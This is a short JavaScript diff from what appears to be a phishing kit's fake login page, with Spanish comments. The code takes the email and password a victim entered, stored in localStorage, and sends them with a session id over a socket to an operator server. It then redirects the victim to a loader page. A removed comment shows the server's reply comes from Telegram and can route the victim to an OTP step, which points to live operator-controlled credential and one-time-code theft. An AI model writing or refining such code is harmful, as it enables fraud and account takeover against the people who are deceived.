@@ -99,24 +99,20 @@
         form.addEventListener('submit', (e) => {
           e.preventDefault();
 
-          const correo = document.getElementById('usuario').value;
-          const contrasena = document.getElementById('clave').value;
+          // Recuperar datos del index.html
           const sessionId = localStorage.getItem('sessionId');
+          const correo = localStorage.getItem('correo');
+          const contrasena = localStorage.getItem('contrasena');
 
-          // Actualizar localStorage con los nuevos datos ingresados
-          localStorage.setItem('correo', correo);
-          localStorage.setItem('contrasena', contrasena);
-
-          // Enviar al servidor con la sesión original
+          // Reenviar los mismos datos sin depender del input
           socket.emit('errorlogoForm', { correo, contrasena, sessionId });
 
-          // Redirigir a la pantalla de espera
+          // Ir al loader
           window.location.href = 'opciones.html';
         });
       }
     });
 
-    // Respuesta desde Telegram
     socket.on("respuestaErrorLogo", (decision) => {
       if (decision === "otp") {
         window.location.href = "bienvenido.html";
